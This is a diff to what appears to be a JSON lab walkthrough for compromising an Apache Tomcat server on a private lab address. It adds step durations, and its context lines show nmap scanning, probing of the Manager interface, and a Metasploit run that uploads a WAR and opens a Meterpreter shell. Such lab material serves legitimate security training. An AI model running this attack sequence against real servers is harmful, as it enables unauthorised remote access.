@@ -12,18 +12,21 @@
       "title": "Scan Tomcat",
       "command": "nmap -sV 172.20.0.19 -p 8080",
       "explanation": "Verify Tomcat is running on port 8080.",
-      "expected": "8080/tcp open http Apache Tomcat"
+      "expected": "8080/tcp open http Apache Tomcat",
+      "duration": "5-10 sec"
     },
     {
       "title": "Check for Manager interface",
       "command": "curl -I http://172.20.0.19:8080/manager/html",
       "explanation": "The Manager app is at /manager/html. It requires authentication.",
-      "expected": "401 Unauthorized (authentication required)"
+      "expected": "401 Unauthorized (authentication required)",
+      "duration": "1-2 sec"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "We'll use Metasploit's Tomcat exploit."
+      "explanation": "We'll use Metasploit's Tomcat exploit.",
+      "duration": "5-15 sec"
     },
     {
       "title": "Load the exploit",
@@ -64,7 +67,8 @@
       "title": "Execute the exploit",
       "command": "run",
       "explanation": "Metasploit creates a WAR, uploads it, triggers execution, and catches the shell.",
-      "expected": "[*] Meterpreter session 1 opened"
+      "expected": "[*] Meterpreter session 1 opened",
+      "duration": "5-15 sec"
     },
     {
       "title": "Explore with Meterpreter",
